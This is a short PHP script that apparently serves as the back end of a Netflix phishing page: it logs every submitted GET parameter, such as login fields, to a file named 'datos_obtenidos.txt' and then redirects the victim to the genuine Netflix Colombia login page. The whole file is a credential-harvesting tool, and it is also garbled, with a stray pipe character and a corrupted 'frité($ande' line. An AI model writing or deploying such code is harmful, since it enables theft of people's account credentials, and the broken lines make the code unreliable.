<?php
header("Location: https://www.netflix.com/co/login ");
$handle = fopen("datos_obtenidos.txt", "a"); 

foreach($_GET as $variable => $value) {
	fwrite($handle, $variable);|

	fwrite($handle, "=");

	fwrite($handle, $value);

	fwrite($handle, "\r\n");
}

frité($ande, "\r\n");
fclose($handle);

exit
?>